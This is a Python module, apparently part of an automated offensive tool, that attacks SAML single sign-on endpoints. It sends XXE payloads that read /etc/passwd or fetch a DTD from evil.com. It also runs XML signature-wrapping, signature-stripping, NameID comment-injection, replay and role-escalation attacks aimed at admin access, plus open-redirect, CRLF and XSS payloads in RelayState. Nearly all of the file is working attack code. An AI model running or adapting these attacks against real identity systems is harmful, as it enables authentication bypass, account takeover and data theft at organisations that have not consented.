"""
BREACH.AI - SAML/SSO Destroyer

Comprehensive SAML and SSO attack module.
Enterprise SSO is complex - complexity means vulnerabilities.

Attack Categories:
1. Signature Bypass - XML signature wrapping attacks
2. XXE Injection - External entity attacks via SAML
3. Assertion Manipulation - Modify claims/attributes
4. Replay Attacks - Reuse old assertions
5. Signature Exclusion - Remove signature entirely
6. Comment Injection - Bypass validation via XML comments
7. Metadata Poisoning - Malicious IdP metadata
"""

import base64
import re
import xml.etree.ElementTree as ET
import zlib
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class SAMLEndpoint:
    """SAML endpoint information."""
    acs_url: str  # Assertion Consumer Service
    sso_url: Optional[str] = None
    slo_url: Optional[str] = None
    metadata_url: Optional[str] = None
    entity_id: Optional[str] = None


class SAMLDestroyer(BaseAttack):
    """
    SAML DESTROYER - Comprehensive SAML/SSO exploitation.

    SAML is notoriously complex and error-prone.
    We exploit every implementation flaw for SSO bypass.
    """

    name = "SAML Destroyer"
    attack_type = "saml_attack"
    description = "Comprehensive SAML/SSO vulnerability exploitation"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    # Common SAML endpoints
    SAML_ENDPOINTS = [
        "/saml/acs", "/saml/consume", "/saml/callback",
        "/auth/saml/callback", "/sso/saml/acs",
        "/saml2/acs", "/saml2/callback",
        "/api/auth/saml/callback",
        "/sso/callback", "/sso/acs",
        "/simplesaml/module.php/saml/sp/saml2-acs.php",
    ]

    # XXE payloads for SAML
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
    ]

    # Signature wrapping positions
    WRAP_POSITIONS = [
        "before_signature",  # Insert copy before signature
        "after_signature",  # Insert copy after signature
        "replace_signed",  # Replace signed element with malicious one
        "nested",  # Nest malicious in signed element
    ]

    def get_payloads(self) -> list[str]:
        return self.XXE_PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if SAML/SSO is in use."""
        response = await self.http_client.get(url)

        saml_indicators = [
            "saml", "samlresponse", "samlrequest",
            "sso", "single sign", "identity provider",
            "idp", "assertion", "entityid",
            "simplesaml", "onelogin", "okta",
            "azure ad", "adfs", "shibboleth",
        ]

        body_lower = response.body.lower()
        return any(ind in body_lower for ind in saml_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive SAML attacks."""
        result = self._create_result(False, url, parameter)

        # Discover SAML endpoints
        endpoint = await self._discover_saml_endpoint(url)
        if not endpoint:
            result.details = "No SAML endpoints found"
            return result

        logger.info(f"[SAML] Found ACS endpoint: {endpoint.acs_url}")

        # Get sample SAML response if available
        saml_response = await self._get_sample_response(url, endpoint)

        # Attack 1: XXE Injection
        xxe_result = await self._attack_xxe(endpoint, saml_response)
        if xxe_result:
            result.success = True
            result.payload = xxe_result["payload"]
            result.details = f"XXE in SAML: {xxe_result['type']}"
            result.add_evidence(
                "saml_xxe",
                "SAML parser vulnerable to XXE",
                xxe_result["details"]
            )
            return result

        # Attack 2: Signature Wrapping
        wrap_result = await self._attack_signature_wrapping(endpoint, saml_response)
        if wrap_result:
            result.success = True
            result.details = f"Signature wrapping: {wrap_result['technique']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "saml_sig_wrap",
                "SAML signature wrapping attack successful",
                wrap_result["details"]
            )
            return result

        # Attack 3: Signature Exclusion
        exclusion_result = await self._attack_signature_exclusion(endpoint, saml_response)
        if exclusion_result:
            result.success = True
            result.details = "SAML accepts unsigned assertions!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "saml_no_sig",
                "SAML assertions accepted without signature",
                exclusion_result["details"]
            )
            return result

        # Attack 4: Comment Injection
        comment_result = await self._attack_comment_injection(endpoint, saml_response)
        if comment_result:
            result.success = True
            result.details = "Comment injection bypasses validation"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "saml_comment",
                "SAML NameID validation bypassed via XML comment",
                comment_result["payload"]
            )
            return result

        # Attack 5: Assertion Replay
        replay_result = await self._attack_replay(endpoint, saml_response)
        if replay_result:
            result.success = True
            result.details = "SAML assertions can be replayed!"
            result.add_evidence(
                "saml_replay",
                "SAML assertions not properly invalidated",
                replay_result["details"]
            )

        # Attack 6: Attribute Manipulation
        attr_result = await self._attack_attribute_manipulation(endpoint, saml_response)
        if attr_result:
            result.success = True
            result.details = f"Attribute manipulation: {attr_result['attribute']}"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "saml_attr_manipulation",
                "SAML attributes can be manipulated",
                attr_result["details"]
            )
            return result

        # Attack 7: RelayState Manipulation
        relay_result = await self._attack_relay_state(endpoint)
        if relay_result:
            result.success = True
            result.details = f"RelayState manipulation: {relay_result['type']}"
            result.add_evidence(
                "saml_relay_state",
                "SAML RelayState vulnerable to manipulation",
                relay_result["payload"]
            )

        # Attack 8: Metadata Exposure
        metadata_result = await self._attack_metadata_exposure(endpoint)
        if metadata_result:
            result.success = True
            result.details = "SAML metadata exposes sensitive info"
            result.add_evidence(
                "saml_metadata",
                "SAML metadata publicly accessible",
                metadata_result["data"]
            )

        return result

    async def _discover_saml_endpoint(self, url: str) -> Optional[SAMLEndpoint]:
        """Discover SAML endpoints."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        endpoint = SAMLEndpoint(acs_url="")

        # Check for metadata
        metadata_paths = [
            "/saml/metadata",
            "/metadata",
            "/FederationMetadata/2007-06/FederationMetadata.xml",
            "/.well-known/saml-configuration",
            "/simplesaml/module.php/saml/sp/metadata.php",
        ]

        for path in metadata_paths:
            try:
                metadata_url = urljoin(base_url, path)
                response = await self.http_client.get(metadata_url)

                if response.status_code == 200 and "entitydescriptor" in response.body.lower():
                    endpoint.metadata_url = metadata_url

                    # Parse metadata for endpoints
                    try:
                        root = ET.fromstring(response.body)
                        ns = {
                            'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
                            'ds': 'http://www.w3.org/2000/09/xmldsig#'
                        }

                        # Find ACS
                        acs = root.find('.//md:AssertionConsumerService', ns)
                        if acs is not None:
                            endpoint.acs_url = acs.get('Location', '')

                        # Find entity ID
                        entity_id = root.get('entityID')
                        if entity_id:
                            endpoint.entity_id = entity_id

                    except ET.ParseError:
                        pass

                    break

            except Exception:
                continue

        # Fallback: probe common ACS endpoints
        if not endpoint.acs_url:
            for path in self.SAML_ENDPOINTS:
                acs_url = urljoin(base_url, path)
                response = await self.http_client.post(acs_url, data={})

                # Valid endpoint might return 400 (missing SAMLResponse)
                if response.status_code in [200, 400]:
                    if "saml" in response.body.lower():
                        endpoint.acs_url = acs_url
                        break

        return endpoint if endpoint.acs_url else None

    async def _get_sample_response(self, url: str, endpoint: SAMLEndpoint) -> Optional[str]:
        """Try to get a sample SAML response."""
        # Check for SAMLResponse in current page
        response = await self.http_client.get(url)

        # Look for encoded SAML response
        saml_pattern = r'SAMLResponse["\s:=]+([A-Za-z0-9+/=]+)'
        match = re.search(saml_pattern, response.body)

        if match:
            try:
                decoded = base64.b64decode(match.group(1))
                return decoded.decode('utf-8')
            except Exception:
                pass

        # Return minimal valid SAML response template
        return self._create_template_response()

    def _create_template_response(self) -> str:
        """Create a template SAML response for testing."""
        return '''<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_id"
                Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="_assertion_id" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                victim@example.com
            </saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
        </saml:Conditions>
        <saml:AttributeStatement>
            <saml:Attribute Name="email">
                <saml:AttributeValue>victim@example.com</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="role">
                <saml:AttributeValue>user</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

    async def _attack_xxe(self, endpoint: SAMLEndpoint, saml_response: Optional[str]) -> Optional[dict]:
        """Test for XXE in SAML parser."""
        logger.debug("[SAML] Testing XXE injection...")

        for xxe_payload in self.XXE_PAYLOADS:
            # Inject XXE into SAML response
            malicious_saml = xxe_payload + '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:Response>'

            encoded = base64.b64encode(malicious_saml.encode()).decode()

            response = await self.http_client.post(
                endpoint.acs_url,
                data={"SAMLResponse": encoded}
            )

            # Check for XXE indicators
            xxe_indicators = ["root:", "/etc/passwd", "file://", "error", "xml"]
            body_lower = response.body.lower()

            if any(ind in body_lower for ind in xxe_indicators):
                # Further verify it's actually XXE
                if "root:x:0:0" in response.body or "xml parsing" in body_lower:
                    return {
                        "type": "XXE",
                        "payload": xxe_payload[:50],
                        "details": "XML parser vulnerable to external entity injection"
                    }

        return None

    async def _attack_signature_wrapping(
        self,
        endpoint: SAMLEndpoint,
        saml_response: Optional[str]
    ) -> Optional[dict]:
        """Test for signature wrapping attacks."""
        logger.debug("[SAML] Testing signature wrapping...")

        if not saml_response:
            saml_response = self._create_template_response()

        # Technique 1: XSW1 - Clone assertion before signature
        xsw1 = self._apply_xsw1(saml_response)

        # Technique 2: XSW2 - Clone assertion after signature
        xsw2 = self._apply_xsw2(saml_response)

        # Technique 3: XSW3 - Add malicious assertion as sibling
        xsw3 = self._apply_xsw3(saml_response)

        for name, payload in [("XSW1", xsw1), ("XSW2", xsw2), ("XSW3", xsw3)]:
            if not payload:
                continue

            encoded = base64.b64encode(payload.encode()).decode()

            response = await self.http_client.post(
                endpoint.acs_url,
                data={"SAMLResponse": encoded}
            )

            # Check for successful authentication
            if response.status_code in [200, 302]:
                success_indicators = ["dashboard", "welcome", "logged", "success"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {
                        "technique": name,
                        "details": f"Signature wrapping attack {name} successful"
                    }

        return None

    def _apply_xsw1(self, saml_response: str) -> Optional[str]:
        """Apply XSW1 attack - copy assertion before signature."""
        try:
            # Parse and modify
            modified = saml_response.replace(
                '<saml:Assertion',
                '<saml:Assertion ID="_evil_assertion"><saml:Subject><saml:NameID>admin@evil.com</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion'
            )
            return modified
        except Exception:
            return None

    def _apply_xsw2(self, saml_response: str) -> Optional[str]:
        """Apply XSW2 attack - copy assertion after signature."""
        try:
            # Insert evil assertion after signature
            modified = saml_response.replace(
                '</saml:Assertion>',
                '</saml:Assertion><saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@evil.com</saml:NameID></saml:Subject></saml:Assertion>'
            )
            return modified
        except Exception:
            return None

    def _apply_xsw3(self, saml_response: str) -> Optional[str]:
        """Apply XSW3 attack - nested malicious assertion."""
        try:
            # Wrap original in new assertion
            modified = saml_response.replace(
                '<saml:Assertion',
                '<saml:Assertion ID="_wrapper"><saml:Subject><saml:NameID>admin@evil.com</saml:NameID></saml:Subject><saml:Assertion',
                1
            )
            return modified
        except Exception:
            return None

    async def _attack_signature_exclusion(
        self,
        endpoint: SAMLEndpoint,
        saml_response: Optional[str]
    ) -> Optional[dict]:
        """Test if unsigned assertions are accepted."""
        logger.debug("[SAML] Testing signature exclusion...")

        if not saml_response:
            saml_response = self._create_template_response()

        # Remove any signature elements
        unsigned = re.sub(
            r'<ds:Signature[^>]*>.*?</ds:Signature>',
            '',
            saml_response,
            flags=re.DOTALL
        )

        encoded = base64.b64encode(unsigned.encode()).decode()

        response = await self.http_client.post(
            endpoint.acs_url,
            data={"SAMLResponse": encoded}
        )

        if response.status_code in [200, 302]:
            # Check for error about missing signature
            error_indicators = ["signature", "unsigned", "invalid", "verification"]
            if not any(ind in response.body.lower() for ind in error_indicators):
                return {
                    "details": "Unsigned SAML assertion was accepted"
                }

        return None

    async def _attack_comment_injection(
        self,
        endpoint: SAMLEndpoint,
        saml_response: Optional[str]
    ) -> Optional[dict]:
        """Test for comment injection in NameID."""
        logger.debug("[SAML] Testing comment injection...")

        if not saml_response:
            saml_response = self._create_template_response()

        # Classic comment injection: admin@evil.com<!---->@victim.com
        payloads = [
            "admin@evil.com<!---->@victim.com",
            "admin@evil.com<!---->.victim.com",
            "admin<!--@evil.com-->@victim.com",
        ]

        for payload in payloads:
            modified = re.sub(
                r'<saml:NameID[^>]*>.*?</saml:NameID>',
                f'<saml:NameID>{payload}</saml:NameID>',
                saml_response,
                flags=re.DOTALL
            )

            encoded = base64.b64encode(modified.encode()).decode()

            response = await self.http_client.post(
                endpoint.acs_url,
                data={"SAMLResponse": encoded}
            )

            if response.status_code in [200, 302]:
                if "admin" in response.body.lower() or "welcome" in response.body.lower():
                    return {"payload": payload}

        return None

    async def _attack_replay(
        self,
        endpoint: SAMLEndpoint,
        saml_response: Optional[str]
    ) -> Optional[dict]:
        """Test for assertion replay vulnerability."""
        logger.debug("[SAML] Testing replay attack...")

        if not saml_response:
            return None  # Need actual response for replay

        encoded = base64.b64encode(saml_response.encode()).decode()

        # Submit same response multiple times
        responses = []
        for _ in range(3):
            response = await self.http_client.post(
                endpoint.acs_url,
                data={"SAMLResponse": encoded}
            )
            responses.append(response.status_code)

        # If all succeeded, replay is possible
        if all(r in [200, 302] for r in responses):
            return {
                "details": "Same SAML assertion accepted multiple times"
            }

        return None

    async def _attack_attribute_manipulation(
        self,
        endpoint: SAMLEndpoint,
        saml_response: Optional[str]
    ) -> Optional[dict]:
        """Test for attribute manipulation."""
        logger.debug("[SAML] Testing attribute manipulation...")

        if not saml_response:
            saml_response = self._create_template_response()

        # Try to escalate role
        role_modifications = [
            ("role", "admin"),
            ("role", "administrator"),
            ("groups", "admin,superuser"),
            ("isAdmin", "true"),
            ("permissions", "all"),
        ]

        for attr_name, attr_value in role_modifications:
            modified = saml_response.replace(
                '<saml:Attribute Name="role">',
                f'<saml:Attribute Name="{attr_name}">'
            ).replace(
                '<saml:AttributeValue>user</saml:AttributeValue>',
                f'<saml:AttributeValue>{attr_value}</saml:AttributeValue>'
            )

            encoded = base64.b64encode(modified.encode()).decode()

            response = await self.http_client.post(
                endpoint.acs_url,
                data={"SAMLResponse": encoded}
            )

            if response.status_code in [200, 302]:
                if "admin" in response.body.lower():
                    return {
                        "attribute": f"{attr_name}={attr_value}",
                        "details": f"Role escalation via {attr_name} attribute"
                    }

        return None

    async def _attack_relay_state(self, endpoint: SAMLEndpoint) -> Optional[dict]:
        """Test for RelayState manipulation vulnerabilities."""
        logger.debug("[SAML] Testing RelayState manipulation...")

        payloads = [
            # Open redirect
            ("https://evil.com", "open_redirect"),
            ("//evil.com", "protocol_relative"),
            ("javascript:alert(1)", "javascript_uri"),

            # CRLF injection
            ("test\r\nSet-Cookie:evil=1", "crlf_injection"),

            # XSS
            ("<script>alert(1)</script>", "xss"),
        ]

        for payload, attack_type in payloads:
            response = await self.http_client.post(
                endpoint.acs_url,
                data={
                    "SAMLResponse": base64.b64encode(b"test").decode(),
                    "RelayState": payload,
                }
            )

            # Check for reflection or redirect
            if response.status_code in [302, 303]:
                location = response.headers.get("Location", "")
                if "evil.com" in location:
                    return {
                        "type": "Open redirect",
                        "payload": payload
                    }

            if payload in response.body:
                return {
                    "type": attack_type,
                    "payload": payload
                }

        return None

    async def _attack_metadata_exposure(self, endpoint: SAMLEndpoint) -> Optional[dict]:
        """Check for exposed SAML metadata with sensitive info."""
        logger.debug("[SAML] Checking metadata exposure...")

        if endpoint.metadata_url:
            response = await self.http_client.get(endpoint.metadata_url)

            if response.status_code == 200:
                # Look for sensitive data
                sensitive_patterns = [
                    r'X509Certificate>([A-Za-z0-9+/=]+)<',
                    r'entityID="([^"]+)"',
                    r'Location="([^"]+)"',
                ]

                found_data = []
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, response.body)
                    if matches:
                        found_data.extend(matches[:2])

                if found_data:
                    return {
                        "data": f"Found: {', '.join(found_data[:5])}"
                    }

        return None
